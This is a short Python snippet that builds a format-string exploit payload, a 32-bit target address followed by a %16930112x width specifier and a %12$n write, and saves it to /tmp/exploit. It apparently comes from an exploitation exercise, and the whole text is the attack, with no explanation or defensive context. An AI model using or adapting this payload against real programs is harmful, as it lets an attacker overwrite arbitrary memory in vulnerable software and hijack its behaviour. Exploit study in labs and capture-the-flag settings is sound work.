payload = b"\x10\x98\x04\x08"
payload += b"%16930112x"
payload += b"%12$n"

with open('/tmp/exploit', 'wb') as f:
    f.write(payload)
